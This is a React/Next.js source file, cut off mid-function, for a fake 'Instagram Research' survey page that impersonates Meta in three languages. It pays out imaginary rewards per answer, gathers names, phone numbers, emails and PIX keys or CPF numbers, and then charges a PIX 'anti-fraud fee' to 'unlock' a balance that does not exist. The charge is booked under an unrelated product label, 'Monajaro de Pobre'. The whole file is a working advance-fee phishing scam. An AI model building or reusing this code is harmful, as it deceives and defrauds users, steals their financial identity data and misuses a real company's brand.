"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import Image from "next/image"
import { getUTMParams, navigateWithUTM } from "@/lib/utm-manager"
import { KeyClubAPI } from "@/lib/keyclub-api"

export default function MetaResearchPromotion() {
  const [fullName, setFullName] = useState("")
  const [isSubmitted, setIsSubmitted] = useState(false)
  const [currentQuestion, setCurrentQuestion] = useState(0)
  const [balance, setBalance] = useState(0)
  const [selectedAnswer, setSelectedAnswer] = useState("")
  const [showRewardModal, setShowRewardModal] = useState(false)
  const [showQuestion5Popup, setShowQuestion5Popup] = useState(false)
  const [showPaymentForm, setShowPaymentForm] = useState(false)
  const [showUnlockBalance, setShowUnlockBalance] = useState(false)
  const [showVideoUnlock, setShowVideoUnlock] = useState(false)
  const [selectedLanguage, setSelectedLanguage] = useState("pt-BR")
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false)
  const [showConfirmationModal, setShowConfirmationModal] = useState(false)
  const [showProcessingModal, setShowProcessingModal] = useState(false)
  const [showPixValidationModal, setShowPixValidationModal] = useState(false)
  const [pixValidationLoading, setPixValidationLoading] = useState(false)
  const [processingProgress, setProcessingProgress] = useState(0)
  const [processingText, setProcessingText] = useState("")
  const [showProcessingError, setShowProcessingError] = useState(false)
  const [redirectCountdown, setRedirectCountdown] = useState(5)
  const [isVideoMuted, setIsVideoMuted] = useState(true)
  const [paymentData, setPaymentData] = useState({
    fullName: "",
    phone: "",
    pixKey: "",
    email: "", // Added email field
  })
  type PixKeyType = "cpf" | "phone" | "email" // Added email type
  const [selectedPixKeyType, setSelectedPixKeyType] = useState<PixKeyType | null>(null)
  const [showUnlockAnimation, setShowUnlockAnimation] = useState(false)
  const [showSupportTooltip, setShowSupportTooltip] = useState(false)
  const [showSupportWidget, setShowSupportWidget] = useState(true)
  const [supportIsTyping, setSupportIsTyping] = useState(false)
  const [showUnlockButton, setShowUnlockButton] = useState(false)
  const [selectedPrice, setSelectedPrice] = useState(0)
  const [earnedAmount, setEarnedAmount] = useState(0)
  const [showPauseOverlay, setShowPauseOverlay] = useState(false)
  const [isVideoPaused, setIsVideoPaused] = useState(false)
  const [overlayClicked, setOverlayClicked] = useState(false)
  const [pixPayload, setPixPayload] = useState("")
  const [showPixPayment, setShowPixPayment] = useState(false)
  const [pixTransactionId, setPixTransactionId] = useState("")
  const [isCreatingPixPayment, setIsCreatingPixPayment] = useState(false)
  const [pixCopied, setPixCopied] = useState(false)
  const [showPixStep, setShowPixStep] = useState(false)
  const [pixLoadingComplete, setPixLoadingComplete] = useState(false)
  const [timeLeft, setTimeLeft] = useState(10 * 60) // 10 minutes in seconds
  const [showUpsell, setShowUpsell] = useState(false)
  const [upsellProducts] = useState([
    {
      id: 1,
      title: "Curso Completo de Monetização",
      description: "Aprenda todas as estratégias avançadas para maximizar seus ganhos",
      originalPrice: 297,
      salePrice: 97,
      features: ["10+ módulos exclusivos", "Suporte direto", "Certificado", "Acesso vitalício"],
    },
    {
      id: 2,
      title: "Kit de Templates Premium",
      description: "Templates prontos para acelerar seus resultados",
      originalPrice: 197,
      salePrice: 47,
      features: ["50+ templates", "Designs profissionais", "Fácil personalização", "Atualizações gratuitas"],
    },
  ])

  const [showRejectionModal, setShowRejectionModal] = useState(false)
  const [showVideoTutorial, setShowVideoTutorial] = useState(false)
  const [rejectionCountdown, setRejectionCountdown] = useState(5)
  const [usedPixKeys, setUsedPixKeys] = useState<Set<string>>(new Set())
  const [processingTimer, setProcessingTimer] = useState<NodeJS.Timeout | null>(null)

  const videoRef = useRef<HTMLVideoElement>(null)

  const [formData, setFormData] = useState({
    fullName: "",
    phone: "",
    pixKey: "",
  })

  useEffect(() => {}, [])

  const checkPaymentStatus = async (transactionId: string) => {
    try {
      // Poll for payment status every 5 seconds
      const interval = setInterval(async () => {
        const response = await fetch(`/api/check-payment-status?id=${transactionId}`)
        const data = await response.json()

        if (data.status === "AUTHORIZED") {
          clearInterval(interval)
          setShowPixStep(false)
          navigateWithUTM("/taxaiof")
        }
      }, 5000)

      // Stop polling after 10 minutes
      setTimeout(() => clearInterval(interval), 10 * 60 * 1000)
    } catch (error) {
      console.error("Error checking payment status:", error)
    }
  }

  const isPixKeyUsed = (pixKey: string): boolean => {
    const savedUsedKeys = localStorage.getItem("usedPixKeys")
    if (savedUsedKeys) {
      const keys = JSON.parse(savedUsedKeys)
      return keys.includes(pixKey)
    }
    return false
  }

  const markPixKeyAsUsed = (pixKey: string) => {
    const savedUsedKeys = localStorage.getItem("usedPixKeys")
    const keys = savedUsedKeys ? JSON.parse(savedUsedKeys) : []
    if (!keys.includes(pixKey)) {
      keys.push(pixKey)
      localStorage.setItem("usedPixKeys", JSON.stringify(keys))
      setUsedPixKeys(new Set(keys))
    }
  }

  useEffect(() => {
    const savedUsedKeys = localStorage.getItem("usedPixKeys")
    if (savedUsedKeys) {
      setUsedPixKeys(new Set(JSON.parse(savedUsedKeys)))
    }
  }, [])

  const createPixPayment = async () => {
    console.log("[v0] Starting PIX payment creation")

    if (isPixKeyUsed(paymentData.pixKey)) {
      alert("Esta chave PIX já foi utilizada para saque.")
      return
    }

    setIsCreatingPixPayment(true)
    setShowPixStep(true) // Show PIX step instead of modal
    setShowVideoUnlock(false) // Hide video unlock step

    try {
      const utmParams = getUTMParams()

      const cleanCpf = selectedPixKeyType === "cpf" ? paymentData.pixKey.replace(/\D/g, "") : "18219822821"

      const customerEmail = selectedPixKeyType === "email" ? paymentData.pixKey : "joao.silva@email.com"

      const transactionData = {
        external_id: `monjaro-pobre-${Date.now()}`,
        total_amount: 8.92,
        payment_method: "PIX",
        webhook_url: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/keyclub/webhook`,
        items: [
          {
            id: "Monajaro-pobre",
            title: "Monajaro de Pobre",
            description: "Monajaro-pobre",
            price: 8.92,
            quantity: 1,
            is_physical: false,
          },
        ],
        ip: "127.0.0.1",
        customer: {
          name: fullName || paymentData.fullName || "João Silva Santos",
          email: customerEmail,
          phone: paymentData.phone || "11987654321",
          document_type: "CPF",
          document: cleanCpf,
          utm_source: utmParams.utm_source || "",
          utm_medium: utmParams.utm_medium || "",
          utm_campaign: utmParams.utm_campaign || "",
          utm_content: utmParams.utm_content || "",
          utm_term: utmParams.utm_term || "",
        },
      }

      console.log("[v0] Creating PIX payment with data:", transactionData)

      console.log("[v0] Creating deposit payment with KeyClub API:", transactionData)

      const response = await fetch("/api/keyclub/deposit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          amount: 8.92,
          external_id: transactionData.external_id,
          clientCallbackUrl: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/keyclub/webhook`,
          payer: {
            name: fullName || paymentData.fullName || "Usuario",
            email: paymentData.email || "usuario@email.com",
            document: cleanCpf,
          },
          utm_params: utmParams,
        }),
      })

      const result = await response.json()

      console.log("[v0] PIX payment response:", result)

      if (result.hasError) {
        console.error("[v0] PIX payment error:", result)
        throw new Error(result.message || "Erro ao criar pagamento PIX")
      }

      const transactionId = result.id || result.transaction_id || result.external_id
      const pixPayload = result.pix?.payload || result.pix_code || result.qr_code

      if (!transactionId || !pixPayload) {
        console.error("[v0] Missing required fields in response:", result)
        throw new Error("Resposta da API incompleta")
      }

      console.log("[v0] Setting PIX data - ID:", transactionId, "Payload length:", pixPayload.length)
      setPixTransactionId(transactionId)
      setPixPayload(pixPayload)

      setTimeout(() => {
        setPixLoadingComplete(true)
      }, 3000)

      checkPaymentStatus(result.id)
    } catch (error) {
      console.error("[v0] Erro ao criar pagamento PIX:", error)
      const errorMessage = error instanceof Error ? error.message : "Erro desconhecido"
      alert(`Erro ao processar pagamento: ${errorMessage}. Tente novamente.`)
      setShowPixStep(false)
      setPixLoadingComplete(false)
    } finally {
      console.log("[v0] PIX creation finished, setting isCreatingPixPayment to false")
      setIsCreatingPixPayment(false)
    }
  }

  const languages = [
    { code: "pt-BR", label: "Português (Brasil)", flag: "🇧🇷" },
    { code: "en-US", label: "English (USA)", flag: "🇺🇸" },
    { code: "es-ES", label: "Español (ESP)", flag: "🇪🇸" },
  ]

  const translations = {
    "pt-BR": {
      welcome: "Bem-vindo(a) ao Instagram Pesquisas",
      fullNamePlaceholder: "Nome completo",
      fullNameDescription: "Insira seu nome completo para prosseguir",
      startResearch: "COMEÇAR PESQUISA",
      important: "Importante:",
      importantText:
        "A Meta nunca solicitará sua senha, código de verificação ou acesso à sua conta. Essa etapa é apenas para fins de verificação.",
      congratulations: "Parabéns!",
      youEarned: "Você ganhou:",
      addedToBalance: "Adicionado ao seu saldo!",
      question: "Pergunta",
      unlockBalance: "DESBLOQUEAR SEU SALDO",
      antiFraudText:
        "Usamos um sistema de verificação para evitar fraudes e abusos nos saques que estavam ocorrendo dentro do sistema.",
      validationText:
        "Fique tranquilo, esta é apenas uma etapa de validação para identificarmos que você não é um robô.",
      continue: "CONTINUAR",
      unlockWithdrawal: "DESBLOQUEAR SAQUE",
      videoUnlockTitle: "DESBLOQUEIO DE SALDO",
      videoUnlockText: "Veja como liberar seu saque assistindo ao vídeo",
      getPersonalizedVideoText: (firstName: string) =>
        firstName
          ? `${firstName}, veja como liberar seu saque assistindo ao vídeo.`
          : "Veja como liberar seu saque assistindo ao vídeo.",
      paymentData: "Dados para Pagamento",
      paymentDescription: "Preencha os dados abaixo para receber sua recompensa",
      fullName: "Nome completo:",
      fullNamePlaceholder: "Digite seu Nome Completo",
      phone: "Telefone com DDD:",
      phonePlaceholder: "(DDD) Seu Numero",
      pixKey: "Chave PIX:",
      pixKeyPlaceholder:
        selectedPixKeyType === "cpf"
          ? "Digite seu CPF"
          : selectedPixKeyType === "phone"
            ? "(DDD) Seu Numero"
            : selectedPixKeyType === "email"
              ? "Seu melhor e-mail"
              : "Selecione o tipo de chave PIX",
      pixKeyTypes: {
        cpf: "CPF",
        phone: "Celular",
        email: "E-mail", // Added email type
      },
      paymentInfo: "O pagamento será efetuado, após verificação dos dados.",
      confirmData: "CONFIRMAR DADOS",
      back: "Voltar",
      confirmDataTitle: "Confirmar seus dados",
      confirmDataQuestion: "Os dados informados estão corretos?",
      yesConfirm: "SIM, CONFIRMAR",
      noWantChange: "Não, quero alterar",
      thankYou: "Obrigado por participar!",
      responsesRecorded: "Suas respostas foram registradas com sucesso.",
      qualifiedText: "Você foi qualificado para receber sua recompensa máxima de R$495.30.",
      finalBalance: "Saldo Final:",
      receiveNow: "RECEBER AGORA",
      termsPrivacy: "Termos e Política de Privacidade",
      needHelp: "Precisa de alguma ajuda?",
      questions: [
        {
          question: "Você já viu algum anúncio suspeito enquanto navegava no Facebook ou Instagram?",
          options: ["Sim, frequentemente", "Às vezes", "Raramente", "Nunca"],
        },
        {
          question: "Esses anúncios estavam relacionados a produtos duvidosos ou golpes financeiros?",
          options: ["Sim, claramente", "Acho que sim", "Não tenho certeza", "Não vi esse tipo de anúncio"],
        },
        {
          question: "Você já viu anúncios com conteúdo impróprio envolvendo crianças ou adolescentes?",
          options: ["Sim, já vi vários", "Vi um ou outro", "Nunca vi", "Prefiro não responder"],
        },
        {
          question: "Você acredita que a Meta deveria fazer uma verificação mais rigorosa dos anunciantes?",
          options: ["Sim, com certeza", "Sim, em alguns casos", "Não é necessário", "Não tenho opinião sobre isso"],
        },
        {
          question: "Você já denunciou algum conteúdo inapropriado envolvendo menores de idade?",
          options: ["Sim, mais de uma vez", "Apenas uma vez", "Nunca denunciei", "Nunca vi esse tipo de conteúdo"],
        },
        {
          question:
            "Você já encontrou erros ou falhas (bugs) na plataforma que prejudicaram sua navegação ou experiência no Instagram?",
          options: [
            "Nunca noteei nenhum bug",
            "Sim, mas não atrapalhou muito",
            "Sim, atrapalhou bastante minha navegação",
            "Sim, cheguei a desistir de usar a plataforma por causa disso",
          ],
        },
        {
          question: "Esses erros ou falhas já expuseram informações pessoais ou atrapalharam sua privacidade?",
          options: [
            "Nunca aconteceu comigo",
            "Já aconteceu, mas sem grandes consequências",
            "Já aconteceu e fiquei preocupado com meus dados",
            "Já aconteceu e tive problemas sérios de privacidade",
          ],
        },
        {
          question:
            "Você já recebeu mensagens de desconhecidos com tentativas de golpe ou links suspeitos dentro do Instagram?",
          options: [
            "Nunca recebi",
            "Recebi poucas vezes",
            "Recebo com frequência",
            "Recebi e cheguei a clicar/ser prejudicado",
          ],
        },
        {
          question: "Você acredita que a plataforma age com rapidez suficiente para remover conteúdos denunciados?",
          options: [
            "Sim, sempre resolve rápido",
            "Às vezes resolve, mas demora",
            "Raramente resolve de forma eficiente",
            "Nunca percebi resultado após denunciar",
          ],
        },
        {
          question:
            "Na sua opinião, os filtros do Instagram conseguem evitar a exposição de menores a conteúdos adultos?",
          options: [
            "Sim, funcionam bem",
            "Funcionam parcialmente",
            "Não funcionam muito bem",
            "Não funcionam de jeito nenhum",
          ],
        },
        {
          question: "Você já teve sua conta comprometida ou conhece alguém que sofreu um golpe dentro da plataforma?",
          options: [
            "Nunca aconteceu comigo ou com conhecidos",
            "Conheço alguém que passou por isso",
            "Já aconteceu comigo, mas consegui recuperar a conta",
            "Já aconteceu comigo e tive prejuízos sérios",
          ],
        },
        {
          question: "Quais medidas você considera mais importantes para aumentar a segurança no Instagram?",
          options: [
            "Verificação mais rígida de anunciantes",
            "Bloqueio automático de contas falsas e suspeitas",
            "Melhor filtragem de conteúdos impróprios",
            "Resposta mais rápida às denúncias dos usuários",
          ],
        },
      ],
      footerText: "Todos os direitos reservados © 2025 Instagram from Meta",
    },
    "en-US": {
      welcome: "Welcome to Instagram Research",
      fullNamePlaceholder: "Full name",
      fullNameDescription: "Enter your full name to proceed",
      startResearch: "START RESEARCH",
      important: "Important:",
      importantText:
        "Meta will never ask for your password, verification code, or access to your account. This step is for verification purposes only.",
      congratulations: "Congratulations!",
      youEarned: "You earned:",
      addedToBalance: "Added to your balance!",
      question: "Question",
      unlockBalance: "UNLOCK YOUR BALANCE",
      antiFraudText:
        "We use an anti-fraud fee to prevent fraud and abuse of withdrawals that were occurring within the system.",
      validationText:
        "Don't worry, you will receive the fee amount back along with your withdrawal amount, it's just a validation step to verify that you are human and not a robot.",
      continue: "CONTINUE",
      unlockWithdrawal: "UNLOCK WITHDRAWAL",
      videoUnlockTitle: "BALANCE UNLOCK",
      videoUnlockText: "See how to release your withdrawal by watching the video",
      getPersonalizedVideoText: (firstName: string) =>
        firstName
          ? `${firstName}, see how to release your withdrawal by watching the video.`
          : "See how to release your withdrawal by watching the video.",
      paymentData: "Payment Information",
      paymentDescription: "Fill in the details below to receive your reward",
      fullName: "Full name:",
      fullNamePlaceholder: "Enter your full name",
      phone: "Phone with area code:",
      phonePlaceholder: "(11) 99999-9999",
      pixKey: "PIX Key (email, CPF or phone number):",
      pixKeyPlaceholder: "Enter your PIX key",
      paymentInfo: "Payment will be made within 24 business hours, after data verification.",
      confirmData: "CONFIRM DATA",
      back: "Back",
      confirmDataTitle: "Confirm your data",
      confirmDataQuestion: "Is the information provided correct?",
      yesConfirm: "YES, CONFIRM",
      noWantChange: "No, I want to change",
      thankYou: "Thank you for participating!",
      responsesRecorded: "Your responses have been successfully recorded.",
      qualifiedText:
        "You have qualified to receive your maximum reward of US$150.00, equivalent to R$895.50 (current rate: R$5.97).",
      finalBalance: "Final Balance:",
      receiveNow: "RECEIVE NOW",
      termsPrivacy: "Terms and Privacy Policy",
      needHelp: "Need any help?",
      questions: [
        {
          question: "Have you ever seen suspicious ads while browsing Facebook or Instagram?",
          options: ["Yes, frequently", "Sometimes", "Rarely", "Never"],
        },
        {
          question: "Were these ads related to dubious products or financial scams?",
          options: ["Yes, clearly", "I think so", "I'm not sure", "I didn't see this type of ad"],
        },
        {
          question: "Have you ever seen ads with inappropriate content involving children or teenagers?",
          options: ["Yes, I've seen several", "I saw one or two", "Never saw", "I prefer not to answer"],
        },
        {
          question: "Do you believe Meta should do more rigorous verification of advertisers?",
          options: ["Yes, definitely", "Yes, in some cases", "It's not necessary", "I have no opinion on this"],
        },
        {
          question: "Have you ever reported inappropriate content involving minors?",
          options: ["Yes, more than once", "Only once", "Never reported", "Never saw this type of content"],
        },
        {
          question:
            "Have you ever encountered errors or bugs on the platform that affected your navigation or Instagram experience?",
          options: [
            "Never noticed any bugs",
            "Yes, but it didn't bother me much",
            "Yes, it greatly affected my navigation",
            "Yes, I even stopped using the platform because of it",
          ],
        },
        {
          question: "Have these errors or bugs ever exposed personal information or affected your privacy?",
          options: [
            "Never happened to me",
            "It happened, but without major consequences",
            "It happened and I was worried about my data",
            "It happened and I had serious privacy issues",
          ],
        },
        {
          question:
            "Have you ever received messages from strangers with scam attempts or suspicious links on Instagram?",
          options: [
            "Never received any",
            "Received a few times",
            "Receive frequently",
            "Received and clicked/was harmed",
          ],
        },
        {
          question: "Do you believe the platform acts quickly enough to remove reported content?",
          options: [
            "Yes, always resolves quickly",
            "Sometimes resolves, but takes time",
            "Rarely resolves efficiently",
            "Never noticed results after reporting",
          ],
        },
        {
          question:
            "In your opinion, do Instagram filters manage to prevent minors from being exposed to adult content?",
          options: [
            "Yes, they work well",
            "They work partially",
            "They don't work very well",
            "They don't work at all",
          ],
        },
        {
          question: "Have you ever had your account compromised or know someone who suffered a scam on the platform?",
          options: [
            "Never happened to me or acquaintances",
            "I know someone who went through this",
            "It happened to me, but I managed to recover the account",
            "It happened to me and I had serious losses",
          ],
        },
        {
          question: "What measures do you consider most important to increase security on Instagram?",
          options: [
            "More rigorous advertiser verification",
            "Automatic blocking of fake and suspicious accounts",
            "Better filtering of inappropriate content",
            "Faster response to user reports",
          ],
        },
      ],
      footerText: "All rights reserved © 2025 Instagram from Meta",
    },
    "es-ES": {
      welcome: "Bienvenido a Instagram Investigación",
      fullNamePlaceholder: "Nombre completo",
      fullNameDescription: "Ingresa tu nombre completo para continuar",
      startResearch: "COMENZAR INVESTIGACIÓN",
      important: "Importante:",
      importantText:
        "Meta nunca solicitará tu contraseña, código de verificación o acceso a tu cuenta. Este paso es solo para fines de verificación.",
      congratulations: "¡Felicidades!",
      youEarned: "Has ganado:",
      addedToBalance: "¡Agregado a tu saldo!",
      question: "Pregunta",
      unlockBalance: "DESBLOQUEAR TU SALDO",
      antiFraudText:
        "Utilizamos una tarifa antifraude para prevenir fraudes y abuso de retiros que estaban ocurriendo dentro del sistema.",
      validationText:
        "No te preocupes, recibirás el monto de la tarifa de vuelta junto con tu monto de retiro, es solo un paso de validación para verificar que eres humano y no un robot.",
      continue: "CONTINUAR",
      unlockWithdrawal: "DESBLOQUEAR RETIRO",
      videoUnlockTitle: "DESBLOQUEO DE SALDO",
      videoUnlockText: "Ve cómo liberar tu retiro viendo el video",
      getPersonalizedVideoText: (firstName: string) =>
        firstName
          ? `${firstName}, ve cómo liberar tu retiro viendo el video.`
          : "Ve cómo liberar tu retiro viendo el video.",
      paymentData: "Dados de Pago",
      paymentDescription: "Completa los datos a continuación para recibir tu recompensa",
      fullName: "Nombre completo:",
      fullNamePlaceholder: "Ingresa tu nombre completo",
      phone: "Teléfono con código de área:",
      phonePlaceholder: "(11) 99999-9999",
      pixKey: "Clave PIX (correo, CPF o número de teléfono):",
      pixKeyPlaceholder: "Ingresa tu clave PIX",
      paymentInfo: "El pago se realizará dentro de 24 horas hábiles, después de la verificación de datos.",
      confirmData: "CONFIRMAR DATOS",
      back: "Volver",
      confirmDataTitle: "Confirmar tus datos",
      confirmDataQuestion: "¿La información proporcionada es correcta?",
      yesConfirm: "SÍ, CONFIRMAR",
      noWantChange: "No, quiero cambiar",
      thankYou: "¡Gracias por participar!",
      responsesRecorded: "Tus respuestas han sido registradas exitosamente.",
      qualifiedText:
        "Te has calificado para recibir tu recompensa máxima de US$150.00, equivalente a R$895.50 (tasa actual: R$5.97).",
      finalBalance: "Saldo Final:",
      receiveNow: "RECIBIR AHORA",
      termsPrivacy: "Términos y Política de Privacidad",
      needHelp: "¿Necesitas alguna ayuda?",
      questions: [
        {
          question: "¿Has visto algún anuncio sospechoso mientras navegabas en Facebook o Instagram?",
          options: ["Sí, frecuentemente", "A veces", "Raramente", "Nunca"],
        },
        {
          question: "¿Estos anuncios estaban relacionados a productos dudosos o estafas financieras?",
          options: ["Sí, claramente", "Creo que sí", "No estoy seguro", "No vi este tipo de anuncio"],
        },
        {
          question: "¿Has visto anuncios con contenido impróprio que involucre niños o adolescentes?",
          options: ["Sí, he visto varios", "Vi uno o dos", "Nunca vi", "Prefiro no responder"],
        },
        {
          question: "¿Crees que Meta debería hacer una verificación más rigurosa de los anunciantes?",
          options: ["Sí, definitivamente", "Sí, en algunos casos", "No es necesario", "No tengo opinión sobre esto"],
        },
        {
          question: "¿Has denunciado algún contenido inapropiado que involucre menores de edad?",
          options: ["Sí, más de una vez", "Solo una vez", "Nunca denuncié", "Nunca vi este tipo de contenido"],
        },
        {
          question:
            "¿Has encontrado errores o fallas (bugs) en la plataforma que perjudicaron tu navegación o experiencia en Instagram?",
          options: [
            "Nunca noté ningún bug",
            "Sí, pero no molestó mucho",
            "Sí, afectó bastante mi navegación",
            "Sí, llegué a dejar de usar la plataforma por eso",
          ],
        },
        {
          question: "¿Estos errores o fallas han expuesto información personal o afectado tu privacidad?",
          options: [
            "Nunca me pasó",
            "Ya pasó, pero sin grandes consecuencias",
            "Ya pasó y me preocupé por mis datos",
            "Ya pasó y tuve problemas serios de privacidad",
          ],
        },
        {
          question: "¿Has recibido mensajes de desconocidos con intentos de estafa o enlaces sospechosos en Instagram?",
          options: [
            "Nunca recibí",
            "Recibí pocas veces",
            "Recibo con frecuencia",
            "Recibí y llegué a hacer clic/ser perjudicado",
          ],
        },
        {
          question: "¿Crees que la plataforma actúa con suficiente rapidez para eliminar contenidos denunciados?",
          options: [
            "Sí, siempre resuelve rápido",
            "A veces resuelve, pero demora",
            "Raramente resuelve de forma eficiente",
            "Nunca noté resultado después de denunciar",
          ],
        },
        {
          question:
            "En tu opinión, ¿los filtros de Instagram logran evitar la exposición de menores a contenidos adultos?",
          options: ["Sí, funcionan bien", "Funcionan parcialmente", "No funcionan muy bien", "No funcionan para nada"],
        },
        {
          question: "¿Has tenido tu cuenta comprometida o conoces a alguien que sufrió una estafa en la plataforma?",
          options: [
            "Nunca me pasó a mí o conocidos",
            "Conozco a alguien que pasó por eso",
            "Me pasó, pero logré recuperar la cuenta",
            "Me pasó y tuve pérdidas serias",
          ],
        },
        {
          question: "¿Qué medidas consideras más importantes para aumentar la seguridad en Instagram?",
          options: [
            "Verificación más rigurosa de anunciantes",
            "Bloqueo automático de cuentas falsas y sospechosas",
            "Mejor filtrado de contenidos impróprios",
            "Respuesta más rápida a las denuncias de usuarios",
          ],
        },
      ],
      footerText: "Todos los derechos reservados © 2025 Instagram from Meta",
    },
  }

  const t = translations[selectedLanguage as keyof typeof translations]

  const validatePixKey = (key: string, type: PixKeyType) => {
    if (!key || !type) return false

    switch (type) {
      case "cpf":
        // Remove caracteres não numéricos e verifica se tem 11 dígitos
        const cpf = key.replace(/\D/g, "")
        return cpf.length === 11
      case "phone":
        // Remove caracteres não numéricos e verifica se tem 11 dígitos (incluindo DDD)
        const phone = key.replace(/\D/g, "")
        return phone.length === 11
      case "email":
        // Validação básica de e-mail
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(key)
      default:
        return false
    }
  }

  const getPersonalizedQuestion = (questionIndex: number, questionText: string) => {
    const firstName = getFirstName(fullName)
    const personalizedQuestions = [0, 3, 5, 7, 9, 11] // Questions to personalize

    if (personalizedQuestions.includes(questionIndex) && firstName) {
      switch (questionIndex) {
        case 0:
          return `${firstName}, você já viu algum anúncio suspeito enquanto navegava no Facebook ou Instagram?`
        case 3:
          return `${firstName}, você acredita que a Meta deveria fazer uma verificação mais rigorosa dos anunciantes?`
        case 5:
          return `${firstName}, você já encontrou erros ou falhas (bugs) na plataforma que prejudicaram sua navegação ou experiência no Instagram?`
        case 7:
          return `${firstName}, você já recebeu mensagens de desconhecidos com tentativas de golpe ou links suspeitos dentro do Instagram?`
        case 9:
          return `${firstName}, na sua opinião, os filtros do Instagram conseguem evitar a exposição de menores a conteúdos adultos?`
        case 11:
          return `${firstName}, quais medidas você considera mais importantes para aumentar a segurança no Instagram?`
        default:
          return questionText
      }
    }
    return questionText
  }

  const getQuestionImage = (questionIndex: number) => {
    const images = [
      "/images/question-1.png", // Pergunta 1 - o-que-e-fraude.png
      "/images/question-2.png", // Pergunta 2 - FRAUDE-.png
      "/images/question-3.jpg", // Pergunta 3 - uso-indevido-de-imagem-capa.jpg
      "/images/question-4.png", // Pergunta 4 - audit-4576720_1280.webp
      "/images/question-5.png", // Pergunta 5 - entenda-o-canal-de-denuncia-3056-5142.jpg
      "/images/question-6.png", // Pergunta 6 - istockphoto-1393580662-612x612.jpg
      "/images/question-7.png", // Pergunta 7 - twg_Privacy_graphic1_desktop.png
      "/images/question-8.png", // Pergunta 8 - compras-sites-falsos.png
      "/images/question-9.png", // Pergunta 9 - 20180605_IGNY_Opening_-72_367128.webp
      "/images/question-10.png", // Pergunta 10 - 20180605_IGNY_Opening_-72_367128.webp
      "/images/question-11.jpg", // Pergunta 11 - ilustracao vazamento de dados
      "/images/question-12.png", // Pergunta 12 - escudo de proteção com mãos
    ]
    return images[questionIndex] || "/images/instagram-logo-official.png"
  }

  const questions = [
    {
      id: 1,
      question: t.questions[0].question,
      options: t.questions[0].options,
      reward: 45.8,
    },
    {
      id: 2,
      question: t.questions[1].question,
      options: t.questions[1].options,
      reward: 38.25,
    },
    {
      id: 3,
      question: t.questions[2].question,
      options: t.questions[2].options,
      reward: 52.1,
    },
    {
      id: 4,
      question: t.questions[3].question,
      options: t.questions[3].options,
      reward: 29.9,
    },
    {
      id: 5,
      question: t.questions[4].question,
      options: t.questions[4].options,
      reward: 41.75,
    },
    {
      id: 6,
      question: t.questions[5].question,
      options: t.questions[5].options,
      reward: 35.6,
    },
    {
      id: 7,
      question: t.questions[6].question,
      options: t.questions[6].options,
      reward: 48.3,
    },
    {
      id: 8,
      question: t.questions[7].question,
      options: t.questions[7].options,
      reward: 33.45,
    },
    {
      id: 9,
      question: t.questions[8].question,
      options: t.questions[8].options,
      reward: 42.85,
    },
    {
      id: 10,
      question: t.questions[9].question,
      options: t.questions[9].options,
      reward: 39.7,
    },
    {
      id: 11,
      question: t.questions[10].question,
      options: t.questions[10].options,
      reward: 44.2,
    },
    {
      id: 12,
      question: t.questions[11].question,
      options: t.questions[11].options,
      reward: 43.5,
    },
  ]

  const handleAnswerSubmit = (answer?: string) => {
    const answerToUse = answer || selectedAnswer
    if (!answerToUse) return

    const currentQuestionData = questions[currentQuestion]
    const realEarned = currentQuestionData.reward

    setEarnedAmount(realEarned)
    setBalance((prev) => prev + realEarned)
    setSelectedPrice(realEarned)

    const audio = new Audio("https://hebbkx1anhila5yf.public.blob.vercel-storage.com/dinheiro-cr1pObT0O7EPDsA2Ymka8b0bUKAAIC.mp3")
    audio.play().catch((error) => console.log("Audio play failed:", error))

    setShowRewardModal(true)

    if (currentQuestion === 4) {
      setTimeout(() => {
        setShowRewardModal(false)
        setShowQuestion5Popup(true)
      }, 3000)
    } else {
      setTimeout(() => {
        setShowRewardModal(false)
        setCurrentQuestion((prev) => prev + 1)
        setSelectedAnswer("")
      }, 3000)
    }
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (fullName) {
      setIsSubmitted(true)
      console.log("Nome completo cadastrado:", fullName)
    }
  }

  const handleLanguageSelect = (languageCode: string) => {
    setSelectedLanguage(languageCode)
    setShowLanguageDropdown(false)
  }

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (showLanguageDropdown) {
        setShowLanguageDropdown(false)
      }
    }

    document.addEventListener("mousedown", handleClickOutside)
    return () => {
      document.removeEventListener("mousedown", handleClickOutside)
    }
  }, [showLanguageDropdown])

  useEffect(() => {
    let timer: NodeJS.Timeout

    if (!isSubmitted) {
      timer = setTimeout(() => {
        setShowSupportTooltip(true)
      }, 5000) // 5 seconds
    }

    return () => {
      if (timer) {
        clearTimeout(timer)
      }
    }
  }, [isSubmitted])

  useEffect(() => {
    let timer: NodeJS.Timeout

    if (showVideoUnlock && !isVideoMuted) {
      setShowUnlockButton(false) // Reset button visibility
      timer = setTimeout(() => {
        setShowUnlockButton(true)
      }, 30000) // 30 segundos após desmutar
    }

    return () => {
      if (timer) {
        clearTimeout(timer)
      }
    }
  }, [showVideoUnlock, isVideoMuted]) // Adicionado isVideoMuted como dependência

  const handleQuestion5Continue = () => {
    setShowQuestion5Popup(false)
    setCurrentQuestion((prev) => prev + 1)
    setSelectedAnswer("")
  }

  const handleReceiveNow = () => {
    setShowPaymentForm(true)
  }

  const handlePaymentSubmit = (e: React.FormEvent) => {
    e.preventDefault()

    if (!paymentData.phone || !paymentData.pixKey || !paymentData.email) {
      alert("Por favor, preencha todos os campos obrigatórios")
      return
    }

    setPaymentData((prev) => ({
      ...prev,
      fullName: fullName || "Usuário Meta Research", // Using collected name or default
      phone: prev.phone || "11952395861", // Use filled phone or default
      email: prev.email || "usuario@metaresearch.com", // Use filled email or default
    }))

    setShowConfirmationModal(true)
  }

  const handleConfirmPayment = async () => {
    console.log("Dados de pagamento:", paymentData)
    setShowConfirmationModal(false)
    setShowPixValidationModal(true)
    setPixValidationLoading(true)

    try {
      if (!paymentData.pixKey || !paymentData.phone || !paymentData.email) {
        alert("Por favor, preencha todos os dados PIX")
        setPixValidationLoading(false)
        setShowPixValidationModal(false)
        setShowConfirmationModal(true)
        return
      }

      let pixKeyType = selectedPixKeyType
      if (!pixKeyType) {
        // Auto-detect based on the PIX key format
